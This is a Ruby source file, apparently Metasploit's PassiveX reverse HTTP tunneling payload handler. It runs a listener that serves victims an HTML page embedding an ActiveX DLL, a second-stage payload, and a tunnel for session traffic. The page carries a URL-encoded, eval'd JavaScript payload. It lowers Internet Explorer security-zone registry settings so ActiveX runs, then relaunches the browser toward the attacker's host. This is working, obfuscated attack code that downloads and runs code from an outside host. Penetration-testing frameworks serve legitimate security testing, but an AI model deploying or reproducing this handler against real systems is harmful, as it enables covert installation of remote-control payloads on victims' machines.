require 'rex/io/stream_abstraction'
require 'rex/sync/ref'

module Msf
module Handler

###
#
# This handler implements the PassiveX reverse HTTP tunneling interface.
#
###
module PassiveX

	include Msf::Handler

	###
	# 
	# This class wrappers the communication channel built over the HTTP
	# communication protocol between a local session and the remote HTTP
	# client.
	#
	###
	class PxSessionChannel

		include Rex::IO::StreamAbstraction
		
		module PxSocketInterface
			
			def type?
				'tcp'
			end
		
			def shutdown(how)
				return false if not remote
				begin
					return (remote.shutdown(how) == 0)
				rescue ::Exception
				end
			end
			
			def peerinfo
				if (pi = getpeername)
					return pi[1] + ':' + pi[2].to_s
				end
			end
			
			def localinfo
				if (pi = getlocalname)
					return pi[1] + ':' + pi[2].to_s
				end
			end
			
			def getlocalname
				getsockname
			end
			
			def getsockname
				return [2,'',''] if not remote
				remote.getsockname
			end
			
			def getpeername
				return [2,'',''] if not remote
				remote.getpeername
			end
			
			attr_accessor :remote
		end
		
		def initialize(sid)
			@remote       = nil  
			@sid          = sid
			@remote_queue = ''
			
			initialize_abstraction
			
			# sf: we don't include Rex::Socket::Tcp as it messes with closing passivex sessions.
			lsock.extend( PxSocketInterface )
			lsock.remote = nil
			
		end

		#
		# Closes the stream abstraction and kills the monitor thread.
		#
		def close
			cleanup_abstraction
		end

		#
		# Sets the remote HTTP client that is to be used for tunneling output
		# data to the client side.
		#
		def remote=(cli)
			# If we already have a remote, then close it now that we have a new one.
			if (@remote)
				begin
					@remote.server.close_client(@remote)
			  rescue
				end
			end

			@remote      = cli
			lsock.remote = @remote
			
			flush_output
		end

		#
		# Writes data to the local side of the abstraction that comes in from
		# the remote.
		#
		def write_local(buf) 
			dlog("PassiveX:#{self} Writing #{buf.length} to local side", 'core', LEV_3)

			rsock.put(buf)
		end

		#
		# Writes data to the remote HTTP client via an indirect queue.
		#
		def write_remote(buf)  
			dlog("PassiveX:#{self} Queuing #{buf.length} to remote side", 'core', LEV_3)

			@remote_queue += buf

			flush_output
		end
		
		#
		# The write function for Rex::IO::StreamAbstraction.monitor_rsock
		#
		def write(buf)
			write_remote(buf)
			return buf.length
		end
		
		#
		# The close_write function for Rex::IO::StreamAbstraction.monitor_rsock
		#
		def close_write
			
		end

		#
		# Flushes the output queue if there is an associated output HTTP client.
		#
		def flush_output
			return if (@remote_queue == nil or @remote_queue.length == 0)
			resp = Rex::Proto::Http::Response.new
			resp.body = @remote_queue
			# sf: we must specify a content type
			resp['Content-Type'] = 'application/octet-stream'
			begin
				if (@remote)
					dlog("PassiveX:#{self} Flushing remote output queue at #{resp.body.length} bytes", 'core', LEV_3)
					# sf: this naughty keepalive was killing the meterpreter over passivex payload, dont re-enable!
					#@remote.keepalive = false
					@remote.send_response(resp)
					@remote = nil
					@remote_queue = ''
				end
			rescue ::Exception
				dlog("PassiveX:#{self} Exception during remote queue flush: #{$!}", 'core', LEV_0)
			end
		end

	end

	#
	# A PassiveX mixin that is used to extend the Msf::Session class in order
	# to add a reference to the payload handler that created the session in a
	# guaranteed fashion.  In turn, the cleanup routine for the session is
	# modified to call deref_handler on the payload handler if it's defined.
	# This is done to ensure that the tunneling handler stays running while
	# there are sessions that still have references to it.
	#
	module PxSession

		def payload_handler=(p)
			@payload_handler = p
		end

		def cleanup
			super

			@payload_handler.deref_handler if (@payload_handler)
		end
	end

	#
	# Class for wrapping reference counting a specific object for passivex.
	#
	class PxRef
		def initialize
			refinit
		end

		include Rex::Ref
	end

	#
	# Returns the string representation of the handler type, in this case
	# 'reverse_http'.
	#
	def self.handler_type
		return "reverse_http"
	end

	#
	# Returns the connection-described general handler type, in this case
	# 'tunnel'.
	#
	def self.general_handler_type
		"tunnel"
	end

	#
	# Initializes the PassiveX HTTP tunneling handler.
	#
	def initialize(info = {})
		super

		register_options(
			[
				OptAddress.new('PXHOST', [ true, "The local HTTP listener hostname" ]),
				OptAddress.new('PXNATHOST', [ true, "The address of the HTTP listener hostname to be sent to the connecting system (if not using NAT is the same as PXHOST)" ]),
				OptPort.new('PXPORT', [ true, "The local HTTP listener port", 8000 ]),
				OptString.new('PXURI', [ false, "The URI root for requests", "/" + Rex::Text.rand_text_alphanumeric(32) ]),
				OptString.new('PXAXCLSID', [ true, "ActiveX CLSID", "B3AC7307-FEAE-4e43-B2D6-161E68ABA838" ]),
				OptString.new('PXAXVER', [ true, "ActiveX DLL Version", "-1,-1,-1,-1" ]),
			], Msf::Handler::PassiveX)

		# Initialize the start of the localized SID pool
		self.sid_pool = 0
		self.session_channels = Hash.new
		self.handler_ref = PxRef.new
	end

	def dll_path
		File.join(Msf::Config.install_root, "data", "passivex", "passivex.dll")
	end

	#
	# Create an HTTP listener that will be connected to and communicated with
	# by the payload that is injected, and possibly used for tunneling
	# purposes.
	#
	def setup_handler
		# Start the HTTP server service on this host/port
		self.service = Rex::ServiceManager.start(Rex::Proto::Http::Server,
			datastore['PXPORT'].to_i, datastore['PXHOST'])

		# Add the new resource
		service.add_resource(datastore['PXURI'],
			'Proc' => Proc.new { |cli, req|
				on_request(cli, req)
			},
			'VirtualDirectory' => true)

		dlog("PassiveX listener started on http://#{datastore['PXHOST']}:#{datastore['PXPORT']}#{datastore['PXURI']}", 'core', LEV_2)

		print_status("PassiveX listener started.")
	end

	#
	# Simply calls stop handler to ensure that things ar ecool.
	#
	def cleanup_handler
	end

	#
	# Basically does nothing.  The service is already started and listening
	# during set up.
	#
	def start_handler
	end

	# 
	# Stops the service and deinitializes it. 
	#
	def stop_handler
		deref_handler
	end

	#
	# PassiveX payloads have a wait-for-session delay of 30 seconds minimum
	# because it can take a bit of time for the OCX to get registered.
	#
	def wfs_delay
		30
	end

	#
	# Called when a new session is created on behalf of this handler.  In this
	# case, we extend the session so that we can track references to the
	# handler since we need to keep the HTTP tunnel up while the session is
	# alive.
	#
	def on_session(session)
		super

		# Extend the session, increment handler references, and set up the
		# session payload handler.
		session.extend(PxSession)
		
		handler_ref.ref

		session.payload_handler = self
	end

	#
	# Decrement the references to the handler that was used by this exploit.
	# If it reaches zero, stop it.
	#
	def deref_handler
		if (handler_ref.deref)
			if (service)
				Rex::ServiceManager.stop_service(service)
	
				self.service.deref
				self.service = nil

				print_status("PassiveX listener stopped.")
			end
	
			flush_session_channels
		end	
	end

protected

	attr_accessor :service # :nodoc:
	attr_accessor :sid_pool # :nodoc:
	attr_accessor :session_channels # :nodoc:
	attr_accessor :handler_ref # :nodoc:

	#
	# Processes the HTTP request from the PassiveX client.  In this case, when
	# a request is made to "/", an HTML body is sent that has an embedded
	# object tag.  This causes the passivex.dll to be downloaded and
	# registered (since registration and downloading have been enabled prior to
	# this point).  After that, the OCX may create a tunnel or download a
	# second stage if instructed by the server.
	#
	def on_request(cli, req)
		sid  = nil
		resp = Rex::Proto::Http::Response.new

		# Grab the SID if one was supplied in the request header.
		if (req['X-Sid'] and 
		    (m = req['X-Sid'].match(/sid=(\d+?)/)))
			sid = m[1]
		end

		# Process the requested resource.
		case req.relative_resource
			when "/"
				# Get a new sid
				self.sid_pool += 1
				nsid = sid_pool

				resp['Content-Type'] = 'text/html'
				# natron 2/27/09: modified to work with IE7/IE8. For some reason on IE8 this can spawn extra set
				# of processes. It works, so will go ahead and commit changes and debug later to run it down.
				resp.body = %Q^<html>  
<object classid="CLSID:#{datastore['PXAXCLSID']}" codebase="#{datastore['PXURI']}/passivex.dll##{datastore['PXAXVER']}">      
   <param name="HttpHost" value="#{datastore['PXNATHOST']}">  
   <param name="HttpPort" value="#{datastore['PXPORT']}">
   <param name="HttpUriBase" value="#{datastore['PXURI']}">  
   <param name="HttpSid" value="#{nsid}">^ + ((stage_payload) ? %Q^
   <param name="DownloadSecondStage" value="1">^ : "") + %Q^
</object>
<script>
var PxHost = "#{datastore['PXNATHOST']}";
var PxPort = "#{datastore['PXPORT']}";
var PxURI = "#{datastore['PXURI']}";

encoded="%76%61%72%20%57%73%68%53%68%65%6c%6c%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%57%73%63%72%69%70%74%2e%53%68%65%6c%6c%22%29%3b%0a%76%61%72%20%6d%61%72%6b%65%72%31%20%3d%20%74%72%75%65%3b%0a%76%61%72%20%6d%61%72%6b%65%72%32%20%3d%20%74%72%75%65%3b%0a%76%61%72%20%77%72%69%74%65%70%65%72%6d%20%3d%20%74%72%75%65%3b%0a%76%61%72%20%72%65%67%43%68%65%63%6b%3b%0a%76%61%72%20%72%65%67%52%61%6e%67%65%20%3d%20%22%48%4b%4c%4d%5c%5c%53%4f%46%54%57%41%52%45%5c%5c%50%6f%6c%69%63%69%65%73%5c%5c%4d%69%63%72%6f%73%6f%66%74%5c%5c%57%69%6e%64%6f%77%73%5c%5c%43%75%72%72%65%6e%74%56%65%72%73%69%6f%6e%5c%5c%49%6e%74%65%72%6e%65%74%20%53%65%74%74%69%6e%67%73%5c%5c%5a%6f%6e%65%4d%61%70%5c%5c%52%61%6e%67%65%73%5c%5c%72%61%6e%64%6f%6d%5c%5c%22%20%2f%2f%43%61%6e%20%62%65%20%61%6e%79%20%76%61%6c%75%65%0a%76%61%72%20%72%65%67%49%6e%74%72%61%6e%65%74%20%3d%20%22%48%4b%4c%4d%5c%5c%53%4f%46%54%57%41%52%45%5c%5c%50%6f%6c%69%63%69%65%73%5c%5c%4d%69%63%72%6f%73%6f%66%74%5c%5c%57%69%6e%64%6f%77%73%5c%5c%43%75%72%72%65%6e%74%56%65%72%73%69%6f%6e%5c%5c%49%6e%74%65%72%6e%65%74%20%53%65%74%74%69%6e%67%73%5c%5c%5a%6f%6e%65%73%5c%5c%31%5c%5c%22%3b%0a%76%61%72%20%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%3d%20%22%48%4b%43%55%5c%5c%53%6f%66%74%77%61%72%65%5c%5c%4d%69%63%72%6f%73%6f%66%74%5c%5c%57%69%6e%64%6f%77%73%5c%5c%43%75%72%72%65%6e%74%56%65%72%73%69%6f%6e%5c%5c%49%6e%74%65%72%6e%65%74%20%53%65%74%74%69%6e%67%73%5c%5c%5a%6f%6e%65%73%5c%5c%31%5c%5c%22%3b%0a%76%61%72%20%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%20%3d%20%22%48%4b%43%55%5c%5c%53%6f%66%74%77%61%72%65%5c%5c%4d%69%63%72%6f%73%6f%66%74%5c%5c%57%69%6e%64%6f%77%73%5c%5c%43%75%72%72%65%6e%74%56%65%72%73%69%6f%6e%5c%5c%49%6e%74%65%72%6e%65%74%20%53%65%74%74%69%6e%67%73%5c%5c%5a%6f%6e%65%4d%61%70%5c%5c%52%61%6e%67%65%73%5c%5c%72%61%6e%64%6f%6d%5c%5c%22%3b%0a%0a%2f%2f%43%68%65%63%6b%20%69%66%20%77%65%27%76%65%20%72%75%6e%20%74%68%69%73%20%62%65%66%6f%72%65%20%2d%20%69%66%20%65%69%74%68%65%72%20%6d%61%72%6b%65%72%20%65%78%69%73%74%73%20%77%65%20%64%6f%6e%74%20%72%75%6e%20%74%68%65%20%72%65%73%74%20%6f%66%20%74%68%69%73%0a%74%72%79%20%7b%20%72%65%67%43%68%65%63%6b%20%3d%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%52%65%61%64%28%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%20%2b%20%22%6d%61%72%6b%65%72%22%29%3b%20%20%7d%20%63%61%74%63%68%20%28%65%29%20%7b%20%6d%61%72%6b%65%72%31%20%3d%20%66%61%6c%73%65%3b%20%7d%0a%74%72%79%20%7b%20%72%65%67%43%68%65%63%6b%20%3d%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%52%65%61%64%28%72%65%67%52%61%6e%67%65%20%2b%20%22%6d%61%72%6b%65%72%22%29%3b%20%7d%20%63%61%74%63%68%20%28%6c%29%20%7b%20%6d%61%72%6b%65%72%32%20%3d%20%66%61%6c%73%65%3b%20%7d%0a%0a%0a%69%66%20%28%6d%61%72%6b%65%72%31%20%3d%3d%20%66%61%6c%73%65%20%26%26%20%6d%61%72%6b%65%72%32%20%3d%3d%20%66%61%6c%73%65%29%20%7b%0a%20%20%20%2f%2f%43%68%65%63%6b%20%66%6f%72%20%77%72%69%74%65%20%70%65%72%6d%69%73%73%69%6f%6e%20%74%6f%20%70%6f%6c%69%63%79%20%6b%65%79%0a%20%20%20%74%72%79%20%7b%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%31%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%20%7d%20%63%61%74%63%68%20%28%66%29%20%7b%20%77%72%69%74%65%70%65%72%6d%20%3d%20%66%61%6c%73%65%3b%20%7d%0a%20%20%20%69%66%20%28%77%72%69%74%65%70%65%72%6d%20%3d%3d%20%66%61%6c%73%65%29%20%7b%0a%20%20%20%20%20%20%2f%2f%53%61%76%65%20%65%78%69%73%74%69%6e%67%20%76%61%6c%75%65%73%0a%20%20%20%20%20%20%74%72%79%20%7b%20%76%61%72%20%72%65%67%56%61%6c%31%30%30%31%20%3d%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%52%65%61%64%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%31%22%29%3b%20%7d%20%63%61%74%63%68%20%28%67%29%20%7b%20%72%65%67%56%61%6c%31%30%30%31%20%3d%20%33%3b%20%7d%0a%20%20%20%20%20%20%74%72%79%20%7b%20%76%61%72%20%72%65%67%56%61%6c%31%30%30%34%20%3d%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%52%65%61%64%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%34%22%29%3b%20%7d%20%63%61%74%63%68%20%28%68%29%20%7b%20%72%65%67%56%61%6c%31%30%30%34%20%3d%20%33%3b%20%7d%0a%20%20%20%20%20%20%74%72%79%20%7b%20%76%61%72%20%72%65%67%56%61%6c%31%32%30%30%20%3d%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%52%65%61%64%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%30%22%29%3b%20%7d%20%63%61%74%63%68%20%28%69%29%20%7b%20%72%65%67%56%61%6c%31%32%30%30%20%3d%20%33%3b%20%7d%0a%20%20%20%20%20%20%74%72%79%20%7b%20%76%61%72%20%72%65%67%56%61%6c%31%32%30%31%20%3d%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%52%65%61%64%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%31%22%29%3b%20%7d%20%63%61%74%63%68%20%28%6a%29%20%7b%20%72%65%67%56%61%6c%31%32%30%31%20%3d%20%33%3b%20%7d%0a%20%20%20%20%20%20%74%72%79%20%7b%20%76%61%72%20%72%65%67%56%61%6c%31%32%30%38%20%3d%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%52%65%61%64%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%38%22%29%3b%20%7d%20%63%61%74%63%68%20%28%6b%29%20%7b%20%72%65%67%56%61%6c%31%32%30%38%20%3d%20%33%3b%20%7d%0a%0a%20%20%20%20%20%20%2f%2f%4d%6f%64%69%66%79%20%70%65%72%6d%73%20%66%6f%72%20%74%68%65%20%49%6e%74%72%61%6e%65%74%20%7a%6f%6e%65%2e%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%31%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%34%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%30%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%31%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%38%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%09%0a%20%20%20%20%20%20%2f%2f%4d%61%70%20%49%50%20%74%6f%20%74%68%65%20%6e%65%77%6c%79%20%6d%6f%64%69%66%69%65%64%20%7a%6f%6e%65%2e%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%2c%31%2c%22%52%45%47%5f%53%5a%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%20%2b%20%22%3a%52%61%6e%67%65%22%2c%50%78%48%6f%73%74%2c%22%52%45%47%5f%53%5a%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%20%2b%20%22%2a%22%2c%31%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%20%2b%20%22%68%74%74%70%22%2c%31%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%20%2b%20%22%6d%61%72%6b%65%72%22%2c%31%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%20%2f%2f%4a%75%73%74%20%61%20%6d%61%72%6b%65%72%0a%20%20%20%7d%20%65%6c%73%65%20%7b%0a%20%20%20%20%20%20%2f%2f%4d%6f%64%69%66%79%20%70%65%72%6d%73%20%66%6f%72%20%74%68%65%20%49%6e%74%72%61%6e%65%74%20%7a%6f%6e%65%2e%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%31%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%34%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%30%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%31%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%38%22%2c%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%09%0a%20%20%20%20%20%20%2f%2f%4d%61%70%20%49%50%20%74%6f%20%74%68%65%20%6e%65%77%6c%79%20%6d%6f%64%69%66%69%65%64%20%7a%6f%6e%65%2e%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%52%61%6e%67%65%2c%31%2c%22%52%45%47%5f%53%5a%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%52%61%6e%67%65%20%2b%20%22%3a%52%61%6e%67%65%22%2c%50%78%48%6f%73%74%2c%22%52%45%47%5f%53%5a%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%52%61%6e%67%65%20%2b%20%22%2a%22%2c%31%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%0a%20%20%20%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%52%61%6e%67%65%20%2b%20%22%6d%61%72%6b%65%72%22%2c%31%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%3b%20%2f%2f%4a%75%73%74%20%61%20%6d%61%72%6b%65%72%20%20%20%20%0a%20%20%20%7d%20%20%20%0a%20%0a%0a%20%20%20%2f%2f%43%6c%65%61%6e%20%75%70%20%61%6e%64%20%64%65%6c%65%74%65%20%74%68%65%20%63%72%65%61%74%65%64%20%65%6e%74%72%69%65%73%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%44%65%6c%65%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%31%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%44%65%6c%65%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%34%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%44%65%6c%65%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%30%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%44%65%6c%65%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%31%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%44%65%6c%65%74%65%28%72%65%67%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%38%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%44%65%6c%65%74%65%28%72%65%67%52%61%6e%67%65%29%27%2c%20%36%30%30%30%30%29%3b%0a%0a%20%20%20%2f%2f%53%65%74%20%74%68%69%6e%67%73%20%62%61%63%6b%20%74%6f%20%74%68%65%69%72%20%6f%72%69%67%69%6e%61%6c%20%76%61%6c%75%65%73%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%31%22%2c%72%65%67%56%61%6c%31%30%30%31%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%30%30%34%22%2c%72%65%67%56%61%6c%31%30%30%34%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%30%22%2c%72%65%67%56%61%6c%31%32%30%30%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%31%22%2c%72%65%67%56%61%6c%31%32%30%31%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%57%72%69%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%49%6e%74%72%61%6e%65%74%20%2b%20%22%31%32%30%38%22%2c%72%65%67%56%61%6c%31%32%30%38%2c%22%52%45%47%5f%44%57%4f%52%44%22%29%27%2c%20%36%30%30%30%30%29%3b%0a%20%20%20%73%65%74%54%69%6d%65%6f%75%74%28%27%57%73%68%53%68%65%6c%6c%2e%52%65%67%44%65%6c%65%74%65%28%72%65%67%4e%6f%6e%70%6f%6c%52%61%6e%67%65%29%27%2c%20%36%30%30%30%30%29%3b%0a%0a%0a%20%20%20%57%73%68%53%68%65%6c%6c%2e%52%75%6e%28%22%69%65%78%70%6c%6f%72%65%2e%65%78%65%20%2d%6e%65%77%20%68%74%74%70%3a%2f%2f%22%20%2b%20%50%78%48%6f%73%74%20%2b%20%22%3a%22%20%2b%20%50%78%50%6f%72%74%20%2b%20%50%78%55%52%49%2c%30%2c%66%61%6c%73%65%29%3b%0a%7d";

eval(unescape(encoded));

</script>
</html>^

				# Create a new local PX session with the supplied sid
				new_session_channel(nsid)
				
				print_status("Sending PassiveX main page to client")
			when "/passivex.dll"
				resp['Content-Type'] = 'application/octet-stream'
				resp.body = ''
				
				File.open(dll_path, "rb") { |f|
					resp.body = f.read
				}
				
				print_status("Sending PassiveX DLL (#{resp.body.length} bytes)")
			when "/stage"
				resp.body = generate_stage

				# Now that we've transmitted a second stage, it's time to indicate
				# that we've found a new session.  We call handle_connection using
				# the lsock of the local stream.
				if (s = find_session_channel(sid))
					Thread.new {
						begin
							s.remote = cli
							handle_connection(s.lsock)
						rescue ::Exception
							elog("Exception raised during PX handle connection: #{$!}", 'core', LEV_1)

							dlog("Call stack:\n#{$@.join("\n")}", 'core', LEV_3)
						end
					}
				end

				print_status("Sending stage to sid #{sid} (#{resp.body.length} bytes)")
			when "/tunnel_in"
				s.write_local(req.body) if (s = find_session_channel(sid))
			when "/tunnel_out" 
				cli.keepalive = true
				resp = nil
				s.remote = cli if (s = find_session_channel(sid))
			else
				resp.code    = 404
				resp.message = "Not found"
		end

		cli.send_response(resp) if (resp)
	end

	#
	# Creates a new session with the supplied sid.
	#
	def new_session_channel(sid)
		self.session_channels[sid.to_i] = PxSessionChannel.new(sid)
	end

	#
	# Finds a session based on the supplied sid
	#
	def find_session_channel(sid)
		session_channels[sid.to_i]
	end

	#
	# Flushes all existing session_channels and cleans up any resources associated with
	# them.
	#
	def flush_session_channels
		session_channels.each_pair { |sid, session|
			session.close
		}

		session_channels = Hash.new
	end

end

end
end
